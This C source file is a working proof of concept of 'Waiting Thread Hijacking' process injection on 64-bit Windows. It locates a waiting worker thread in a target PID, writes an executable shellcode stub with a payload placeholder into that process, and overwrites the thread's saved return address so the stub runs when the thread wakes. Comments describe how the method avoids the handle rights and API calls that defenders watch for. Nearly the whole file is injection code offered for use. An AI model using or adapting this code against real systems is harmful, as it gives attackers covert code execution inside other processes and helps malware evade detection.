#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")

// ─────────────────────────────────────────────────────────────────────────────
// Native API typedefs
// ─────────────────────────────────────────────────────────────────────────────
typedef NTSTATUS(NTAPI *pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *pNtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS(NTAPI *pNtReadVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

static pNtQuerySystemInformation NtQuerySystemInformation_Ptr = NULL;
static pNtGetContextThread       NtGetContextThread_Ptr       = NULL;
static pNtReadVirtualMemory      NtReadVirtualMemory_Ptr      = NULL;
static pNtWriteVirtualMemory     NtWriteVirtualMemory_Ptr     = NULL;

// ─────────────────────────────────────────────────────────────────────────────
// Shellcode stub — x64
//
// Layout (verified):
//   [0x00] pushfq
//   [0x01] push rax,rbx,rcx,rdx
//   [0x05] push rsi,rdi,rbp
//   [0x08] push r8–r15  (8 × 2 bytes = 16 bytes)
//   [0x18] sub  rsp, 0x20
//   [0x1C] nop              ← payload placeholder
//   [0x1D] add  rsp, 0x20
//   [0x21] pop  r15–r8
//   [0x31] pop  rbp,rdi,rsi,rdx
//   [0x35] pop  rcx,rbx,rax
//   [0x38] popfq
//   [0x39] mov  rax, imm64  (REX + opcode)
//   [0x3B] <8-byte return address>   ← ORIGINAL_RET_OFFSET
//   [0x43] jmp  rax
// Total: 69 bytes
// ─────────────────────────────────────────────────────────────────────────────
static unsigned char wth_shellcode[] = {
    0x9c,                                          /* pushfq            */
    0x50, 0x53, 0x51, 0x52,                        /* push rax,rbx,rcx,rdx */
    0x56, 0x57, 0x55,                              /* push rsi,rdi,rbp  */
    0x41, 0x50, 0x41, 0x51,                        /* push r8, r9       */
    0x41, 0x52, 0x41, 0x53,                        /* push r10,r11      */
    0x41, 0x54, 0x41, 0x55,                        /* push r12,r13      */
    0x41, 0x56, 0x41, 0x57,                        /* push r14,r15      */
    0x48, 0x83, 0xec, 0x20,                        /* sub  rsp, 0x20    */
    0x90,                                          /* nop  (payload)    */
    0x48, 0x83, 0xc4, 0x20,                        /* add  rsp, 0x20    */
    0x41, 0x5f, 0x41, 0x5e,                        /* pop  r15,r14      */
    0x41, 0x5d, 0x41, 0x5c,                        /* pop  r13,r12      */
    0x41, 0x5b, 0x41, 0x5a,                        /* pop  r11,r10      */
    0x41, 0x59, 0x41, 0x58,                        /* pop  r9, r8       */
    0x5d, 0x5f, 0x5e, 0x5a,                        /* pop  rbp,rdi,rsi,rdx */
    0x59, 0x5b, 0x58,                              /* pop  rcx,rbx,rax  */
    0x9d,                                          /* popfq             */
    0x48, 0xb8,                                    /* mov  rax, imm64   */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,/* <return address>  */
    0xff, 0xe0                                     /* jmp  rax          */
};

// Offset of the 8-byte return address slot inside the stub (verified: 0x3B)
static const SIZE_T SHELLCODE_SIZE       = sizeof(wth_shellcode); /* 69 */
static const SIZE_T ORIGINAL_RET_OFFSET  = 0x3B;

// ─────────────────────────────────────────────────────────────────────────────
// SYSTEM_PROCESS_INFORMATION — full layout required to access Threads[]
// ─────────────────────────────────────────────────────────────────────────────
typedef struct _SYSTEM_PROCESS_INFORMATION_EXT {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  WorkingSetPrivateSize;
    ULONG          HardFaultCount;
    ULONG          NumberOfThreadsHighWatermark;
    ULONGLONG      CycleTime;
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
    ULONG_PTR      UniqueProcessKey;
    SIZE_T         PeakVirtualSize;
    SIZE_T         VirtualSize;
    ULONG          PageFaultCount;
    SIZE_T         PeakWorkingSetSize;
    SIZE_T         WorkingSetSize;
    SIZE_T         QuotaPeakPagedPoolUsage;
    SIZE_T         QuotaPagedPoolUsage;
    SIZE_T         QuotaPeakNonPagedPoolUsage;
    SIZE_T         QuotaNonPagedPoolUsage;
    SIZE_T         PagefileUsage;
    SIZE_T         PeakPagefileUsage;
    SIZE_T         PrivatePageCount;
    LARGE_INTEGER  ReadOperationCount;
    LARGE_INTEGER  WriteOperationCount;
    LARGE_INTEGER  OtherOperationCount;
    LARGE_INTEGER  ReadTransferCount;
    LARGE_INTEGER  WriteTransferCount;
    LARGE_INTEGER  OtherTransferCount;
    SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESS_INFORMATION_EXT;

// ─────────────────────────────────────────────────────────────────────────────
// Resolve Native APIs from ntdll at runtime
// ─────────────────────────────────────────────────────────────────────────────
static BOOL InitAPIs(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;

    NtQuerySystemInformation_Ptr =
        (pNtQuerySystemInformation)GetProcAddress(h, "NtQuerySystemInformation");
    NtGetContextThread_Ptr =
        (pNtGetContextThread)GetProcAddress(h, "NtGetContextThread");
    NtReadVirtualMemory_Ptr =
        (pNtReadVirtualMemory)GetProcAddress(h, "NtReadVirtualMemory");
    NtWriteVirtualMemory_Ptr =
        (pNtWriteVirtualMemory)GetProcAddress(h, "NtWriteVirtualMemory");

    return (NtQuerySystemInformation_Ptr &&
            NtGetContextThread_Ptr       &&
            NtReadVirtualMemory_Ptr      &&
            NtWriteVirtualMemory_Ptr);
}

// ─────────────────────────────────────────────────────────────────────────────
// Validate that 'addr' falls within any loaded module in hProc.
// WTH only hijacks threads whose [RSP] points into ntdll/kernel32/kernelbase
// to guarantee a flat syscall-stub stack layout.
// ─────────────────────────────────────────────────────────────────────────────
static BOOL IsInKnownModule(HANDLE hProc, DWORD64 addr)
{
    HMODULE mods[1024];
    DWORD   needed = 0;

    if (!EnumProcessModules(hProc, mods, sizeof(mods), &needed))
        return FALSE;

    DWORD count = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < count; i++) {
        MODULEINFO info = {0};
        if (GetModuleInformation(hProc, mods[i], &info, sizeof(info))) {
            DWORD64 base = (DWORD64)info.lpBaseOfDll;
            if (addr >= base && addr < base + info.SizeOfImage)
                return TRUE;
        }
    }
    return FALSE;
}

// ─────────────────────────────────────────────────────────────────────────────
// Enumerate threads in target PID via NtQuerySystemInformation.
// Returns the first TID with ThreadState==5 (Waiting) && WaitReason==7 (WrQueue).
//
// WrQueue indicates the thread is blocked inside NtWaitForWorkViaWorkerFactory
// or NtRemoveIoCompletion — both have a flat stack with [RSP] == return address.
// ─────────────────────────────────────────────────────────────────────────────
static BOOL FindWaitingThread(DWORD pid, LPDWORD tid)
{
    ULONG   size   = 0x20000;
    PVOID   buf    = NULL;
    NTSTATUS status;

    // Grow buffer until NtQuerySystemInformation succeeds
    for (;;) {
        buf = realloc(buf, size);
        if (!buf) return FALSE;

        status = NtQuerySystemInformation_Ptr(
                     SystemProcessInformation, buf, size, NULL);

        if (status == 0x00000000L) break;          /* STATUS_SUCCESS    */

        if (status == 0xC0000004L) {               /* STATUS_INFO_LENGTH_MISMATCH */
            size *= 2;
            if (size > 0x2000000) { free(buf); return FALSE; }
            continue;
        }

        free(buf);
        return FALSE;
    }

    SYSTEM_PROCESS_INFORMATION_EXT *proc =
        (SYSTEM_PROCESS_INFORMATION_EXT *)buf;

    while (proc) {
        if ((DWORD)(DWORD_PTR)proc->UniqueProcessId == pid) {
            for (ULONG i = 0; i < proc->NumberOfThreads; i++) {
                SYSTEM_THREAD_INFORMATION *t = &proc->Threads[i];
                // State 5 = Waiting, WaitReason 7 = WrQueue
                if (t->ThreadState == 5 && t->WaitReason == 7) {
                    *tid = (DWORD)(DWORD_PTR)t->ClientId.UniqueThread;
                    printf("[+] Found WrQueue waiting thread: TID %lu\n", *tid);
                    free(buf);
                    return TRUE;
                }
            }
            break; // found our PID but no suitable thread
        }

        if (!proc->NextEntryOffset) break;
        proc = (SYSTEM_PROCESS_INFORMATION_EXT *)
               ((PBYTE)proc + proc->NextEntryOffset);
    }

    free(buf);
    return FALSE;
}

// ─────────────────────────────────────────────────────────────────────────────
// Core WTH injection:
//
//  1. Open process with VM access only (no PROCESS_CREATE_THREAD)
//  2. Allocate RW memory, write stub, patch return-address slot
//  3. Make memory RX via VirtualProtectEx
//  4. Open thread with THREAD_GET_CONTEXT only
//  5. Read RSP from thread context
//  6. Validate [RSP] is a legitimate module return address
//  7. Overwrite [RSP] with stub address  ← the WTH primitive
//  8. Thread wakes naturally and executes stub → original return address
//
// Critical ordering: patch SAVED_RET_PTR slot BEFORE making memory RX,
// and overwrite [RSP] AFTER memory is RX so the thread can execute it
// immediately upon waking.
// ─────────────────────────────────────────────────────────────────────────────
static BOOL ExecuteWTH(DWORD pid, DWORD tid)
{
    printf("[*] Target PID: %lu  TID: %lu\n", pid, tid);

    // ── Step 1: Open process (no PROCESS_CREATE_THREAD required) ──────────
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE, pid);
    if (!hProc) {
        printf("[!] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Process handle obtained\n");

    // ── Step 2: Allocate RW (not yet executable) memory for stub ──────────
    PVOID stub_addr = VirtualAllocEx(
        hProc, NULL, SHELLCODE_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);   // RW — not RWX yet
    if (!stub_addr) {
        printf("[!] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] Memory allocated at 0x%llx\n", (DWORD64)stub_addr);

    // ── Step 3: Build a local copy of the stub with placeholder zeroed ─────
    unsigned char local_stub[sizeof(wth_shellcode)];
    memcpy(local_stub, wth_shellcode, SHELLCODE_SIZE);
    // Return address slot remains 0x00 × 8 for now — filled in Step 6

    // Write initial stub (return address slot still zeroed)
    if (!WriteProcessMemory(hProc, stub_addr, local_stub, SHELLCODE_SIZE, NULL)) {
        printf("[!] WriteProcessMemory (stub) failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] Stub written to target\n");

    // ── Step 4: Open thread — THREAD_GET_CONTEXT only ─────────────────────
    // WTH does NOT require THREAD_SUSPEND_RESUME or THREAD_SET_CONTEXT.
    // This is the key difference from classical Thread Execution Hijacking.
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT, FALSE, tid);
    if (!hThread) {
        printf("[!] OpenThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    // ── Step 5: Read RSP from thread context ──────────────────────────────
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;   // only need RSP/RIP — minimal footprint
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] GetThreadContext failed: %lu\n", GetLastError());
        CloseHandle(hThread);
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] RSP: 0x%llx  RIP: 0x%llx\n", ctx.Rsp, ctx.Rip);
    CloseHandle(hThread);   // done with thread handle

    // ── Step 6: Read and validate [RSP] (current return address) ──────────
    DWORD64 orig_ret = 0;
    if (!ReadProcessMemory(hProc, (LPCVOID)ctx.Rsp,
                           &orig_ret, sizeof(orig_ret), NULL)) {
        printf("[!] ReadProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] Return address at [RSP]: 0x%llx\n", orig_ret);

    if (!IsInKnownModule(hProc, orig_ret)) {
        printf("[!] Return address not in a known module — thread unsafe to hijack\n");
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    // ── Step 7: Patch SAVED_RET_PTR slot in stub while memory is still RW ─
    // This MUST happen before VirtualProtectEx changes perms to RX,
    // and before we overwrite [RSP].
    if (!WriteProcessMemory(hProc,
                            (LPVOID)((ULONG_PTR)stub_addr + ORIGINAL_RET_OFFSET),
                            &orig_ret, sizeof(orig_ret), NULL)) {
        printf("[!] WriteProcessMemory (patch ret slot) failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] Original return address embedded in stub\n");

    // ── Step 8: Make stub executable (RW → RX) ────────────────────────────
    DWORD old_prot = 0;
    if (!VirtualProtectEx(hProc, stub_addr, SHELLCODE_SIZE,
                          PAGE_EXECUTE_READ, &old_prot)) {
        printf("[!] VirtualProtectEx failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    printf("[+] Memory protection set to RX\n");

    // ── Step 9: Overwrite [RSP] with stub address — the WTH primitive ─────
    // From this point the thread will execute our stub when it next wakes.
    // No SuspendThread, no SetThreadContext, no ResumeThread.
    DWORD64 stub_ptr = (DWORD64)stub_addr;
    if (!WriteProcessMemory(hProc, (LPVOID)ctx.Rsp,
                            &stub_ptr, sizeof(stub_ptr), NULL)) {
        printf("[!] WriteProcessMemory (overwrite [RSP]) failed: %lu\n",
               GetLastError());
        VirtualFreeEx(hProc, stub_addr, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] [RSP] overwritten: 0x%llx → 0x%llx\n", orig_ret, stub_ptr);
    printf("[+] Waiting for thread to wake naturally and execute stub...\n");

    CloseHandle(hProc);
    return TRUE;
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char **argv)
{
    printf("\n=== Waiting Thread Hijacking PoC ===\n");
    printf("    Based on research by hasherezade (Check Point Research, 2025)\n\n");

    if (argc < 2) {
        printf("Usage: %s <target_PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atol(argv[1]);

    // Basic safety guards
    if (pid == 0 || pid == 4) {
        printf("[!] Cannot target System (PID 0/4)\n");
        return 1;
    }
    if (pid == GetCurrentProcessId()) {
        printf("[!] Cannot target own process\n");
        return 1;
    }

    if (!InitAPIs()) {
        printf("[!] Failed to resolve Native APIs from ntdll.dll\n");
        return 1;
    }
    printf("[+] Native APIs resolved\n");

    DWORD tid = 0;
    printf("[*] Searching for WrQueue waiting thread in PID %lu...\n", pid);

    if (!FindWaitingThread(pid, &tid)) {
        printf("[!] No suitable WrQueue thread found in target process\n");
        return 1;
    }

    printf("[*] Executing WTH injection...\n");
    if (!ExecuteWTH(pid, tid)) {
        printf("[!] Injection failed\n");
        return 1;
    }

    printf("\n[+] Done — shellcode will execute when thread wakes from WrQueue wait\n\n");
    return 0;
}